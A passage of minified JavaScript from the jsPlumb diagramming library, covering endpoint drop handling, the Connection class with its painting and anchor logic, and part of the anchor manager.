                    if (this.connections[c].endpoints[1] === a || this.connections[c].endpoints[0] === a) {
                        b = !0;
                        break
                    }
            return b
        },
        getConnectionCost: function() {
            return this._jsPlumb.connectionCost
        },
        setConnectionCost: function(a) {
            this._jsPlumb.connectionCost = a
        },
        areConnectionsDirected: function() {
            return this._jsPlumb.connectionsDirected
        },
        setConnectionsDirected: function(a) {
            this._jsPlumb.connectionsDirected = a
        },
        setElementId: function(a) {
            this.elementId = a,
            this.anchor.elementId = a
        },
        setReferenceElement: function(a) {
            this.element = b.getElement(a)
        },
        setDragAllowedWhenFull: function(a) {
            this.dragAllowedWhenFull = a
        },
        equals: function(a) {
            return this.anchor.equals(a.anchor)
        },
        getUuid: function() {
            return this._jsPlumb.uuid
        },
        computeAnchor: function(a) {
            return this.anchor.compute(a)
        }
    }),
    a.jsPlumbInstance.prototype.EndpointDropHandler = function(a) {
        return function(b) {
            var d = a.jsPlumb;
            a.removeClass(d.endpointDropAllowedClass),
            a.removeClass(d.endpointDropForbiddenClass);
            var e = d.getDropEvent(arguments)
              , f = d.getDragObject(arguments)
              , g = d.getAttribute(f, "dragId")
              , h = (d.getAttribute(f, "elId"),
            d.getAttribute(f, "originalScope"))
              , i = d.floatingConnections[g];
            if (null != i) {
                var j = null != i.suspendedEndpoint;
                if (!j || null != i.suspendedEndpoint._jsPlumb) {
                    var k = a.getEndpoint(i);
                    if (null != k) {
                        if (a.isRedrop(i, a))
                            return i._forceReattach = !0,
                            i.setHover(!1),
                            void (a.maybeCleanup && a.maybeCleanup(k));
                        var l = d.getFloatingAnchorIndex(i);
                        if (0 === l && !a.isSource || 1 === l && !a.isTarget)
                            return void (a.maybeCleanup && a.maybeCleanup(k));
                        a.onDrop && a.onDrop(i),
                        h && d.setDragScope(f, h);
                        var m = a.isFull(b);
                        if (m && k.fire("maxConnections", {
                            endpoint: this,
                            connection: i,
                            maxConnections: k._jsPlumb.maxConnections
                        }, e),
                        !m && a.enabled()) {
                            var n = !0;
                            0 === l ? (i.floatingElement = i.source,
                            i.floatingId = i.sourceId,
                            i.floatingEndpoint = i.endpoints[0],
                            i.floatingIndex = 0,
                            i.source = a.element,
                            i.sourceId = a.elementId) : (i.floatingElement = i.target,
                            i.floatingId = i.targetId,
                            i.floatingEndpoint = i.endpoints[1],
                            i.floatingIndex = 1,
                            i.target = a.element,
                            i.targetId = a.elementId),
                            j && i.suspendedEndpoint.id !== k.id && (i.isDetachAllowed(i) && i.endpoints[l].isDetachAllowed(i) && i.suspendedEndpoint.isDetachAllowed(i) && d.checkCondition("beforeDetach", i) || (n = !1));
                            var o = function(b) {
                                i.endpoints[l].detachFromConnection(i),
                                i.suspendedEndpoint && i.suspendedEndpoint.detachFromConnection(i),
                                i.endpoints[l] = k,
                                k.addConnection(i);
                                var f = k.getParameters();
                                for (var g in f)
                                    i.setParameter(g, f[g]);
                                if (j) {
                                    var h = i.suspendedEndpoint.elementId;
                                    d.fireMoveEvent({
                                        index: l,
                                        originalSourceId: 0 === l ? h : i.sourceId,
                                        newSourceId: 0 === l ? k.elementId : i.sourceId,
                                        originalTargetId: 1 === l ? h : i.targetId,
                                        newTargetId: 1 === l ? k.elementId : i.targetId,
                                        originalSourceEndpoint: 0 === l ? i.suspendedEndpoint : i.endpoints[0],
                                        newSourceEndpoint: 0 === l ? k : i.endpoints[0],
                                        originalTargetEndpoint: 1 === l ? i.suspendedEndpoint : i.endpoints[1],
                                        newTargetEndpoint: 1 === l ? k : i.endpoints[1],
                                        connection: i
                                    }, e)
                                } else
                                    f.draggable && d.initDraggable(this.element, a.dragOptions, "internal", d);
                                if (1 === l ? d.anchorManager.updateOtherEndpoint(i.sourceId, i.floatingId, i.targetId, i) : d.anchorManager.sourceChanged(i.floatingId, i.sourceId, i, i.source),
                                i.endpoints[0].finalEndpoint) {
                                    var m = i.endpoints[0];
                                    m.detachFromConnection(i),
                                    i.endpoints[0] = i.endpoints[0].finalEndpoint,
                                    i.endpoints[0].addConnection(i)
                                }
                                c.isObject(b) && i.mergeData(b),
                                d.finaliseConnection(i, null, e, !1),
                                i.setHover(!1)
                            }
                            .bind(this)
                              , p = function() {
                                i.suspendedEndpoint && (i.endpoints[l] = i.suspendedEndpoint,
                                i.setHover(!1),
                                i._forceDetach = !0,
                                0 === l ? (i.source = i.suspendedEndpoint.element,
                                i.sourceId = i.suspendedEndpoint.elementId) : (i.target = i.suspendedEndpoint.element,
                                i.targetId = i.suspendedEndpoint.elementId),
                                i.suspendedEndpoint.addConnection(i),
                                1 === l ? d.anchorManager.updateOtherEndpoint(i.sourceId, i.floatingId, i.targetId, i) : d.anchorManager.sourceChanged(i.floatingId, i.sourceId, i, i.source),
                                d.repaint(i.sourceId),
                                i._forceDetach = !1)
                            };
                            if (n = n && a.isDropAllowed(i.sourceId, i.targetId, i.scope, i, k))
                                return o(n),
                                !0;
                            p()
                        }
                        a.maybeCleanup && a.maybeCleanup(k),
                        d.currentlyDragging = !1
                    }
                }
            }
        }
    }
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = function(a, c, d, e, f) {
        if (!a.Defaults.DoNotThrowErrors && null == b.Connectors[c][d])
            throw {
                msg: "jsPlumb: unknown connector type '" + d + "'"
            };
        return new b.Connectors[c][d](e,f)
    }
      , e = function(a, b, c) {
        return a ? c.makeAnchor(a, b, c) : null
    }
      , f = function(a, b, d, e) {
        null != b && (b._jsPlumbConnections = b._jsPlumbConnections || {},
        e ? delete b._jsPlumbConnections[a.id] : b._jsPlumbConnections[a.id] = !0,
        c.isEmpty(b._jsPlumbConnections) ? d.removeClass(b, d.connectedClass) : d.addClass(b, d.connectedClass))
    };
    b.Connection = function(a) {
        var d = a.newEndpoint;
        this.id = a.id,
        this.connector = null,
        this.idPrefix = "_jsplumb_c_",
        this.defaultLabelLocation = .5,
        this.defaultOverlayKeys = ["Overlays", "ConnectionOverlays"],
        this.previousConnection = a.previousConnection,
        this.source = b.getElement(a.source),
        this.target = b.getElement(a.target),
        a.sourceEndpoint && (this.source = a.sourceEndpoint.getElement()),
        a.targetEndpoint && (this.target = a.targetEndpoint.getElement()),
        b.OverlayCapableJsPlumbUIComponent.apply(this, arguments),
        this.sourceId = this._jsPlumb.instance.getId(this.source),
        this.targetId = this._jsPlumb.instance.getId(this.target),
        this.scope = a.scope,
        this.endpoints = [],
        this.endpointStyles = [];
        var e = this._jsPlumb.instance;
        e.manage(this.sourceId, this.source),
        e.manage(this.targetId, this.target),
        this._jsPlumb.visible = !0,
        this._jsPlumb.editable = a.editable === !0,
        this._jsPlumb.params = {
            cssClass: a.cssClass,
            container: a.container,
            "pointer-events": a["pointer-events"],
            editorParams: a.editorParams,
            overlays: a.overlays
        },
        this._jsPlumb.lastPaintedAt = null,
        this.bind("mouseover", function() {
            this.setHover(!0)
        }
        .bind(this)),
        this.bind("mouseout", function() {
            this.setHover(!1)
        }
        .bind(this)),
        this.editableRequested = a.editable !== !1,
        this.setEditable = function(a) {
            return !!this.connector && this.connector.setEditable(a)
        }
        ,
        this.isEditable = function() {
            return !!this.connector && this.connector.isEditable()
        }
        ,
        this.isEditing = function() {
            return !!this.connector && this.connector.isEditing()
        }
        ,
        this.makeEndpoint = function(b, c, f, g) {
            return f = f || this._jsPlumb.instance.getId(c),
            this.prepareEndpoint(e, d, this, g, b ? 0 : 1, a, c, f)
        }
        ,
        a.type && (a.endpoints = a.endpoints || this._jsPlumb.instance.deriveEndpointAndAnchorSpec(a.type).endpoints);
        var f = this.makeEndpoint(!0, this.source, this.sourceId, a.sourceEndpoint)
          , g = this.makeEndpoint(!1, this.target, this.targetId, a.targetEndpoint);
        f && c.addToList(a.endpointsByElement, this.sourceId, f),
        g && c.addToList(a.endpointsByElement, this.targetId, g),
        this.scope || (this.scope = this.endpoints[0].scope),
        null != a.deleteEndpointsOnEmpty && (this.endpoints[0].setDeleteOnEmpty(a.deleteEndpointsOnEmpty),
        this.endpoints[1].setDeleteOnEmpty(a.deleteEndpointsOnEmpty));
        var h = e.Defaults.ConnectionsDetachable;
        a.detachable === !1 && (h = !1),
        this.endpoints[0].connectionsDetachable === !1 && (h = !1),
        this.endpoints[1].connectionsDetachable === !1 && (h = !1);
        var i = a.reattach || this.endpoints[0].reattachConnections || this.endpoints[1].reattachConnections || e.Defaults.ReattachConnections;
        this.appendToDefaultType({
            detachable: h,
            reattach: i,
            paintStyle: this.endpoints[0].connectorStyle || this.endpoints[1].connectorStyle || a.paintStyle || e.Defaults.PaintStyle || b.Defaults.PaintStyle,
            hoverPaintStyle: this.endpoints[0].connectorHoverStyle || this.endpoints[1].connectorHoverStyle || a.hoverPaintStyle || e.Defaults.HoverPaintStyle || b.Defaults.HoverPaintStyle
        });
        var j = e.getSuspendedAt();
        if (!e.isSuspendDrawing()) {
            var k = e.getCachedData(this.sourceId)
              , l = k.o
              , m = k.s
              , n = e.getCachedData(this.targetId)
              , o = n.o
              , p = n.s
              , q = j || e.timestamp()
              , r = this.endpoints[0].anchor.compute({
                xy: [l.left, l.top],
                wh: m,
                element: this.endpoints[0],
                elementId: this.endpoints[0].elementId,
                txy: [o.left, o.top],
                twh: p,
                tElement: this.endpoints[1],
                timestamp: q
            });
            this.endpoints[0].paint({
                anchorLoc: r,
                timestamp: q
            }),
            r = this.endpoints[1].anchor.compute({
                xy: [o.left, o.top],
                wh: p,
                element: this.endpoints[1],
                elementId: this.endpoints[1].elementId,
                txy: [l.left, l.top],
                twh: m,
                tElement: this.endpoints[0],
                timestamp: q
            }),
            this.endpoints[1].paint({
                anchorLoc: r,
                timestamp: q
            })
        }
        this.getTypeDescriptor = function() {
            return "connection"
        }
        ,
        this.getAttachedElements = function() {
            return this.endpoints
        }
        ,
        this.isDetachable = function() {
            return this._jsPlumb.detachable === !0
        }
        ,
        this.setDetachable = function(a) {
            this._jsPlumb.detachable = a === !0
        }
        ,
        this.isReattach = function() {
            return this._jsPlumb.reattach === !0 || this.endpoints[0].reattachConnections === !0 || this.endpoints[1].reattachConnections === !0
        }
        ,
        this.setReattach = function(a) {
            this._jsPlumb.reattach = a === !0
        }
        ,
        this._jsPlumb.cost = a.cost || this.endpoints[0].getConnectionCost(),
        this._jsPlumb.directed = a.directed,
        null == a.directed && (this._jsPlumb.directed = this.endpoints[0].areConnectionsDirected());
        var s = b.extend({}, this.endpoints[1].getParameters());
        b.extend(s, this.endpoints[0].getParameters()),
        b.extend(s, this.getParameters()),
        this.setParameters(s),
        this.setConnector(this.endpoints[0].connector || this.endpoints[1].connector || a.connector || e.Defaults.Connector || b.Defaults.Connector, !0),
        a.geometry && this.connector.setGeometry(a.geometry);
        var t = null != a.data && c.isObject(a.data) ? a.data : {};
        this.getData = function() {
            return t
        }
        ,
        this.setData = function(a) {
            t = a || {}
        }
        ,
        this.mergeData = function(a) {
            t = b.extend(t, a)
        }
        ;
        var u = ["default", this.endpoints[0].connectionType, this.endpoints[1].connectionType, a.type].join(" ");
        /[^\s]/.test(u) && this.addType(u, a.data, !0),
        this.updateConnectedClass()
    }
    ,
    c.extend(b.Connection, b.OverlayCapableJsPlumbUIComponent, {
        applyType: function(a, c, d) {
            null != a.detachable && this.setDetachable(a.detachable),
            null != a.reattach && this.setReattach(a.reattach),
            a.scope && (this.scope = a.scope),
            null != a.cssClass && this.canvas && this._jsPlumb.instance.addClass(this.canvas, a.cssClass);
            var e = null;
            a.anchor ? (e = this.getCachedTypeItem("anchors", d.anchor),
            null == e && (e = [this._jsPlumb.instance.makeAnchor(a.anchor), this._jsPlumb.instance.makeAnchor(a.anchor)],
            this.cacheTypeItem("anchors", e, d.anchor))) : a.anchors && (e = this.getCachedTypeItem("anchors", d.anchors),
            null == e && (e = [this._jsPlumb.instance.makeAnchor(a.anchors[0]), this._jsPlumb.instance.makeAnchor(a.anchors[1])],
            this.cacheTypeItem("anchors", e, d.anchors))),
            null != e && (this.endpoints[0].anchor = e[0],
            this.endpoints[1].anchor = e[1],
            this.endpoints[1].anchor.isDynamic && this._jsPlumb.instance.repaint(this.endpoints[1].elementId)),
            b.OverlayCapableJsPlumbUIComponent.applyType(this, a)
        },
        addClass: function(a, b) {
            b && (this.endpoints[0].addClass(a),
            this.endpoints[1].addClass(a),
            this.suspendedEndpoint && this.suspendedEndpoint.addClass(a)),
            this.connector && this.connector.addClass(a)
        },
        removeClass: function(a, b) {
            b && (this.endpoints[0].removeClass(a),
            this.endpoints[1].removeClass(a),
            this.suspendedEndpoint && this.suspendedEndpoint.removeClass(a)),
            this.connector && this.connector.removeClass(a)
        },
        isVisible: function() {
            return this._jsPlumb.visible
        },
        setVisible: function(a) {
            this._jsPlumb.visible = a,
            this.connector && this.connector.setVisible(a),
            this.repaint()
        },
        cleanup: function() {
            this.updateConnectedClass(!0),
            this.endpoints = null,
            this.source = null,
            this.target = null,
            null != this.connector && (this.connector.cleanup(!0),
            this.connector.destroy(!0)),
            this.connector = null
        },
        updateConnectedClass: function(a) {
            this._jsPlumb && (f(this, this.source, this._jsPlumb.instance, a),
            f(this, this.target, this._jsPlumb.instance, a))
        },
        setHover: function(b) {
            this.connector && this._jsPlumb && !this._jsPlumb.instance.isConnectionBeingDragged() && (this.connector.setHover(b),
            a.jsPlumb[b ? "addClass" : "removeClass"](this.source, this._jsPlumb.instance.hoverSourceClass),
            a.jsPlumb[b ? "addClass" : "removeClass"](this.target, this._jsPlumb.instance.hoverTargetClass))
        },
        getUuids: function() {
            return [this.endpoints[0].getUuid(), this.endpoints[1].getUuid()]
        },
        getCost: function() {
            return this._jsPlumb ? this._jsPlumb.cost : -(1 / 0)
        },
        setCost: function(a) {
            this._jsPlumb.cost = a
        },
        isDirected: function() {
            return this._jsPlumb.directed === !0
        },
        getConnector: function() {
            return this.connector
        },
        getGeometry: function() {
            return this.connector ? this.connector.getGeometry() : null
        },
        setGeometry: function(a) {
            this.connector && this.connector.setGeometry(a)
        },
        prepareConnector: function(a, b) {
            var e, f = {
                _jsPlumb: this._jsPlumb.instance,
                cssClass: (this._jsPlumb.params.cssClass || "") + (this.isEditable() ? this._jsPlumb.instance.editableConnectorClass : ""),
                container: this._jsPlumb.params.container,
                "pointer-events": this._jsPlumb.params["pointer-events"],
                editable: this.editableRequested
            }, g = this._jsPlumb.instance.getRenderMode();
            return c.isString(a) ? e = d(this._jsPlumb.instance, g, a, f, this) : c.isArray(a) && (e = 1 === a.length ? d(this._jsPlumb.instance, g, a[0], f, this) : d(this._jsPlumb.instance, g, a[0], c.merge(a[1], f), this)),
            null != b && (e.typeId = b),
            e
        },
        setPreparedConnector: function(a, b, c, d) {
            var e, f = "";
            if (null != this.connector && (e = this.connector,
            f = e.getClass(),
            this.connector.cleanup(),
            this.connector.destroy()),
            this.connector = a,
            d && this.cacheTypeItem("connector", a, d),
            this.canvas = this.connector.canvas,
            this.bgCanvas = this.connector.bgCanvas,
            this.addClass(f),
            this.canvas && (this.canvas._jsPlumb = this),
            this.bgCanvas && (this.bgCanvas._jsPlumb = this),
            null != e)
                for (var g = this.getOverlays(), h = 0; h < g.length; h++)
                    g[h].transfer && g[h].transfer(this.connector);
            c || this.setListenerComponent(this.connector),
            b || this.repaint()
        },
        setConnector: function(a, b, c, d) {
            var e = this.prepareConnector(a, d);
            this.setPreparedConnector(e, b, c, d)
        },
        paint: function(a) {
            if (!this._jsPlumb.instance.isSuspendDrawing() && this._jsPlumb.visible) {
                a = a || {};
                var b = a.timestamp
                  , c = !1
                  , d = c ? this.sourceId : this.targetId
                  , e = c ? this.targetId : this.sourceId
                  , f = c ? 0 : 1
                  , g = c ? 1 : 0;
                if (null == b || b !== this._jsPlumb.lastPaintedAt) {
                    var h = this._jsPlumb.instance.updateOffset({
                        elId: e
                    }).o
                      , i = this._jsPlumb.instance.updateOffset({
                        elId: d
                    }).o
                      , j = this.endpoints[g]
                      , k = this.endpoints[f]
                      , l = j.anchor.getCurrentLocation({
                        xy: [h.left, h.top],
                        wh: [h.width, h.height],
                        element: j,
                        timestamp: b
                    })
                      , m = k.anchor.getCurrentLocation({
                        xy: [i.left, i.top],
                        wh: [i.width, i.height],
                        element: k,
                        timestamp: b
                    });
                    this.connector.resetBounds(),
                    this.connector.compute({
                        sourcePos: l,
                        targetPos: m,
                        sourceEndpoint: this.endpoints[g],
                        targetEndpoint: this.endpoints[f],
                        "stroke-width": this._jsPlumb.paintStyleInUse.strokeWidth,
                        sourceInfo: h,
                        targetInfo: i
                    });
                    var n = {
                        minX: 1 / 0,
                        minY: 1 / 0,
                        maxX: -(1 / 0),
                        maxY: -(1 / 0)
                    };
                    for (var o in this._jsPlumb.overlays)
                        if (this._jsPlumb.overlays.hasOwnProperty(o)) {
                            var p = this._jsPlumb.overlays[o];
                            p.isVisible() && (this._jsPlumb.overlayPlacements[o] = p.draw(this.connector, this._jsPlumb.paintStyleInUse, this.getAbsoluteOverlayPosition(p)),
                            n.minX = Math.min(n.minX, this._jsPlumb.overlayPlacements[o].minX),
                            n.maxX = Math.max(n.maxX, this._jsPlumb.overlayPlacements[o].maxX),
                            n.minY = Math.min(n.minY, this._jsPlumb.overlayPlacements[o].minY),
                            n.maxY = Math.max(n.maxY, this._jsPlumb.overlayPlacements[o].maxY))
                        }
                    var q = parseFloat(this._jsPlumb.paintStyleInUse.strokeWidth || 1) / 2
                      , r = parseFloat(this._jsPlumb.paintStyleInUse.strokeWidth || 0)
                      , s = {
                        xmin: Math.min(this.connector.bounds.minX - (q + r), n.minX),
                        ymin: Math.min(this.connector.bounds.minY - (q + r), n.minY),
                        xmax: Math.max(this.connector.bounds.maxX + (q + r), n.maxX),
                        ymax: Math.max(this.connector.bounds.maxY + (q + r), n.maxY)
                    };
                    this.connector.paint(this._jsPlumb.paintStyleInUse, null, s);
                    for (var t in this._jsPlumb.overlays)
                        if (this._jsPlumb.overlays.hasOwnProperty(t)) {
                            var u = this._jsPlumb.overlays[t];
                            u.isVisible() && u.paint(this._jsPlumb.overlayPlacements[t], s)
                        }
                }
                this._jsPlumb.lastPaintedAt = b
            }
        },
        repaint: function(a) {
            a = a || {},
            this.paint({
                elId: this.sourceId,
                recalc: !(a.recalc === !1),
                timestamp: a.timestamp
            })
        },
        prepareEndpoint: function(a, c, d, f, g, h, i, j) {
            var k;
            if (f)
                d.endpoints[g] = f,
                f.addConnection(d);
            else {
                h.endpoints || (h.endpoints = [null, null]);
                var l = h.endpoints[g] || h.endpoint || a.Defaults.Endpoints[g] || b.Defaults.Endpoints[g] || a.Defaults.Endpoint || b.Defaults.Endpoint;
                h.endpointStyles || (h.endpointStyles = [null, null]),
                h.endpointHoverStyles || (h.endpointHoverStyles = [null, null]);
                var m = h.endpointStyles[g] || h.endpointStyle || a.Defaults.EndpointStyles[g] || b.Defaults.EndpointStyles[g] || a.Defaults.EndpointStyle || b.Defaults.EndpointStyle;
                null == m.fill && null != h.paintStyle && (m.fill = h.paintStyle.stroke),
                null == m.outlineStroke && null != h.paintStyle && (m.outlineStroke = h.paintStyle.outlineStroke),
                null == m.outlineWidth && null != h.paintStyle && (m.outlineWidth = h.paintStyle.outlineWidth);
                var n = h.endpointHoverStyles[g] || h.endpointHoverStyle || a.Defaults.EndpointHoverStyles[g] || b.Defaults.EndpointHoverStyles[g] || a.Defaults.EndpointHoverStyle || b.Defaults.EndpointHoverStyle;
                null != h.hoverPaintStyle && (null == n && (n = {}),
                null == n.fill && (n.fill = h.hoverPaintStyle.stroke));
                var o = h.anchors ? h.anchors[g] : h.anchor ? h.anchor : e(a.Defaults.Anchors[g], j, a) || e(b.Defaults.Anchors[g], j, a) || e(a.Defaults.Anchor, j, a) || e(b.Defaults.Anchor, j, a)
                  , p = h.uuids ? h.uuids[g] : null;
                k = c({
                    paintStyle: m,
                    hoverPaintStyle: n,
                    endpoint: l,
                    connections: [d],
                    uuid: p,
                    anchor: o,
                    source: i,
                    scope: h.scope,
                    reattach: h.reattach || a.Defaults.ReattachConnections,
                    detachable: h.detachable || a.Defaults.ConnectionsDetachable
                }),
                null == f && k.setDeleteOnEmpty(!0),
                d.endpoints[g] = k,
                h.drawEndpoints === !1 && k.setVisible(!1, !0, !0)
            }
            return k
        }
    })
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbUtil
      , c = a.jsPlumb;
    c.AnchorManager = function(a) {
        var d = {}
          , e = {}
          , f = {}
          , g = {}
          , h = {
            HORIZONTAL: "horizontal",
            VERTICAL: "vertical",
            DIAGONAL: "diagonal",
            IDENTITY: "identity"
        }
          , i = ["left", "top", "right", "bottom"]
          , j = {}
          , k = this
          , l = {}
          , m = a.jsPlumbInstance
          , n = {}
          , o = function(a, b, c, d, e, f) {
            if (a === b)
                return {
                    orientation: h.IDENTITY,
                    a: ["top", "top"]
                };
            var g = Math.atan2(d.centery - c.centery, d.centerx - c.centerx)
              , j = Math.atan2(c.centery - d.centery, c.centerx - d.centerx)
              , k = []
              , l = {};
            !function(a, b) {
                for (var c = 0; c < a.length; c++)
                    l[a[c]] = {
                        left: [b[c].left, b[c].centery],
                        right: [b[c].right, b[c].centery],
                        top: [b[c].centerx, b[c].top],
                        bottom: [b[c].centerx, b[c].bottom]
                    }
            }(["source", "target"], [c, d]);
            for (var m = 0; m < i.length; m++)
                for (var n = 0; n < i.length; n++)
                    k.push({
                        source: i[m],
                        target: i[n],
                        dist: Biltong.lineLength(l.source[i[m]], l.target[i[n]])
                    });
            k.sort(function(a, b) {
                return a.dist < b.dist ? -1 : a.dist > b.dist ? 1 : 0
            });
            for (var o = k[0].source, p = k[0].target, q = 0; q < k.length && (o = !e.isContinuous || e.isEdgeSupported(k[q].source) ? k[q].source : null,
            p = !f.isContinuous || f.isEdgeSupported(k[q].target) ? k[q].target : null,
            null == o || null == p); q++)
                ;
            return {
                a: [o, p],
                theta: g,
                theta2: j
            }
        }
          , p = function(a, b, c, d, e, f, g) {
            for (var h = [], i = b[e ? 0 : 1] / (d.length + 1), j = 0; j < d.length; j++) {
                var k = (j + 1) * i
                  , l = f * b[e ? 1 : 0];
                g && (k = b[e ? 0 : 1] - k);
                var m = e ? k : l
                  , n = c[0] + m
                  , o = m / b[0]
                  , p = e ? l : k
                  , q = c[1] + p
                  , r = p / b[1];
                h.push([n, q, o, r, d[j][1], d[j][2]])
            }
            return h
        }
          , q = function(a) {
            return function(b, c) {
                var d = !0;
                return d = a ? b[0][0] < c[0][0] : b[0][0] > c[0][0],
                d === !1 ? -1 : 1
            }
        }
          , r = function(a, b) {
            var c = a[0][0] < 0 ? -Math.PI - a[0][0] : Math.PI - a[0][0]
              , d = b[0][0] < 0 ? -Math.PI - b[0][0] : Math.PI - b[0][0];
            return c > d ? 1 : -1
        }
          , s = {
            top: function(a, b) {
                return a[0] > b[0] ? 1 : -1
            },
            right: q(!0),
            bottom: q(!0),
            left: r
        }
          , t = function(a, b) {
            return a.sort(b)
        }
          , u = function(a, b) {
            var c = m.getCachedData(a)
              , d = c.s
              , f = c.o
              , h = function(b, c, d, f, h, i, j) {
                if (f.length > 0)
                    for (var k = t(f, s[b]), l = "right" === b || "top" === b, m = p(b, c, d, k, h, i, l), n = function(a, b) {
                        e[a.id] = [b[0], b[1], b[2], b[3]],
                        g[a.id] = j
                    }, o = 0; o < m.length; o++) {
                        var q = m[o][4]
                          , r = q.endpoints[0].elementId === a
                          , u = q.endpoints[1].elementId === a;
                        r && n(q.endpoints[0], m[o]),
                        u && n(q.endpoints[1], m[o])
                    }
            };
            h("bottom", d, [f.left, f.top], b.bottom, !0, 1, [0, 1]),
            h("top", d, [f.left, f.top], b.top, !0, 0, [0, -1]),
            h("left", d, [f.left, f.top], b.left, !1, 0, [-1, 0]),
            h("right", d, [f.left, f.top], b.right, !1, 1, [1, 0])
        };
        this.reset = function() {
            d = {},
            j = {},
            l = {}
        }
        ,
        this.addFloatingConnection = function(a, b) {
            n[a] = b
        }
        ,
        this.removeFloatingConnection = function(a) {
            delete n[a]
        }
        ,
        this.newConnection = function(a) {
            var d = a.sourceId
              , e = a.targetId
              , f = a.endpoints
              , g = !0
              , h = function(h, i, k, l, m) {
                d === e && k.isContinuous && (a._jsPlumb.instance.removeElement(f[1].canvas),
                g = !1),
                b.addToList(j, l, [m, i, k.constructor === c.DynamicAnchor])
            };
            h(0, f[0], f[0].anchor, e, a),
            g && h(1, f[1], f[1].anchor, d, a)
        }
        ;
        var v = function(a) {
            !function(a, c) {
                if (a) {
                    var d = function(a) {
                        return a[4] === c
                    };
                    b.removeWithFunction(a.top, d),
                    b.removeWithFunction(a.left, d),
                    b.removeWithFunction(a.bottom, d),
                    b.removeWithFunction(a.right, d)
                }
            }(l[a.elementId], a.id)
        };
        this.connectionDetached = function(a, c) {
            var d = a.connection || a
              , e = a.sourceId
              , f = a.targetId
              , g = d.endpoints
              , h = function(a, c, d, e, f) {
                b.removeWithFunction(j[e], function(a) {
                    return a[0].id === f.id
                })
            };
            h(1, g[1], g[1].anchor, e, d),
            h(0, g[0], g[0].anchor, f, d),
            d.floatingId && (h(d.floatingIndex, d.floatingEndpoint, d.floatingEndpoint.anchor, d.floatingId, d),
            v(d.floatingEndpoint)),
            v(d.endpoints[0]),
            v(d.endpoints[1]),
            c || (k.redraw(d.sourceId),
            d.targetId !== d.sourceId && k.redraw(d.targetId))
        }
        ,
        this.add = function(a, c) {
            b.addToList(d, c, a)
        }
        ,
        this.changeId = function(a, b) {
            j[b] = j[a],
            d[b] = d[a],
            delete j[a],
            delete d[a]
        }
        ,
        this.getConnectionsFor = function(a) {
            return j[a] || []
        }
        ,
        this.getEndpointsFor = function(a) {
            return d[a] || []
        }
        ,
        this.deleteEndpoint = function(a) {
            b.removeWithFunction(d[a.elementId], function(b) {
                return b.id === a.id
            }),
            v(a)
        }
        ,
        this.clearFor = function(a) {
            delete d[a],
            d[a] = []
        }
        ;
        var w = function(c, d, e, f, g, h, i, j, k, l, m, n) {
            var o, p, q = -1, r = -1, s = f.endpoints[i], t = s.id, u = [1, 0][i], v = [[d, e], f, g, h, t], w = c[k], x = s._continuousAnchorEdge ? c[s._continuousAnchorEdge] : null;
            if (x) {
                var y = b.findWithFunction(x, function(a) {
                    return a[4] === t
                });
                if (y !== -1)
                    for (x.splice(y, 1),
                    o = 0; o < x.length; o++)
                        p = x[o][1],
                        b.addWithFunction(m, p, function(a) {
                            return a.id === p.id
                        }),
                        b.addWithFunction(n, x[o][1].endpoints[i], function(a) {
                            return a.id === p.endpoints[i].id
                        }),
                        b.addWithFunction(n, x[o][1].endpoints[u], function(a) {
                            return a.id === p.endpoints[u].id
                        })
            }
            for (o = 0; o < w.length; o++)
                p = w[o][1],
                1 === a.idx && w[o][3] === h && r === -1 && (r = o),
                b.addWithFunction(m, p, function(a) {
                    return a.id === p.id
                }),
                b.addWithFunction(n, w[o][1].endpoints[i], function(a) {
                    return a.id === p.endpoints[i].id
                }),
                b.addWithFunction(n, w[o][1].endpoints[u], function(a) {
                    return a.id === p.endpoints[u].id
                });
            if (q !== -1)
                w[q] = v;
            else {
                var z = j ? r !== -1 ? r : 0 : w.length;
                w.splice(z, 0, v)
            }
            s._continuousAnchorEdge = k
        };
        this.updateOtherEndpoint = function(a, d, e, f) {
            var g = b.findWithFunction(j[a], function(a) {
                return a[0].id === f.id
            })
              , h = b.findWithFunction(j[d], function(a) {
                return a[0].id === f.id
            });
            g !== -1 && (j[a][g][0] = f,
            j[a][g][1] = f.endpoints[1],
            j[a][g][2] = f.endpoints[1].anchor.constructor === c.DynamicAnchor),
            h > -1 && (j[d].splice(h, 1),
            b.addToList(j, e, [f, f.endpoints[0], f.endpoints[0].anchor.constructor === c.DynamicAnchor])),
            f.updateConnectedClass()
        }
        ,
        this.sourceChanged = function(a, d, e, f) {
            if (a !== d) {
                e.sourceId = d,
                e.source = f,
                b.removeWithFunction(j[a], function(a) {
                    return a[0].id === e.id
                });
                var g = b.findWithFunction(j[e.targetId], function(a) {
                    return a[0].id === e.id
                });
                g > -1 && (j[e.targetId][g][0] = e,
                j[e.targetId][g][1] = e.endpoints[0],
                j[e.targetId][g][2] = e.endpoints[0].anchor.constructor === c.DynamicAnchor),
                b.addToList(j, d, [e, e.endpoints[1], e.endpoints[1].anchor.constructor === c.DynamicAnchor]),
                e.endpoints[1].anchor.isContinuous && (e.source === e.target ? e._jsPlumb.instance.removeElement(e.endpoints[1].canvas) : null == e.endpoints[1].canvas.parentNode && e._jsPlumb.instance.appendElement(e.endpoints[1].canvas)),
                e.updateConnectedClass()
            }
        }
        ,
        this.rehomeEndpoint = function(a, b, c) {
            var e = d[b] || []
              , f = m.getId(c);
            if (f !== b) {
                var g = e.indexOf(a);
                if (g > -1) {
                    var h = e.splice(g, 1)[0];
                    k.add(h, f)
                }
            }
            for (var i = 0; i < a.connections.length; i++)
                a.connections[i].sourceId === b ? k.sourceChanged(b, a.elementId, a.connections[i], a.element) : a.connections[i].targetId === b && (a.connections[i].targetId = a.elementId,
                a.connections[i].target = a.element,
                k.updateOtherEndpoint(a.connections[i].sourceId, b, a.elementId, a.connections[i]))
        }
        ,
        this.redraw = function(a, e, f, g, h, i) {
            if (!m.isSuspendDrawing()) {
                var k = d[a] || []
                  , p = j[a] || []
                  , q = []
                  , r = []
                  , s = [];
                f = f || m.timestamp(),
                g = g || {
                    left: 0,
                    top: 0
                },
                e && (e = {
                    left: e.left + g.left,
                    top: e.top + g.top
                });
                for (var t = m.updateOffset({
                    elId: a,
                    offset: e,
                    recalc: !1,
                    timestamp: f
                }), v = {}, x = 0; x < p.length; x++) {
                    var y = p[x][0]
                      , z = y.sourceId
                      , A = y.targetId
                      , B = y.endpoints[0].anchor.isContinuous
                      , C = y.endpoints[1].anchor.isContinuous;
                    if (B || C) {
                        var D = z + "_" + A
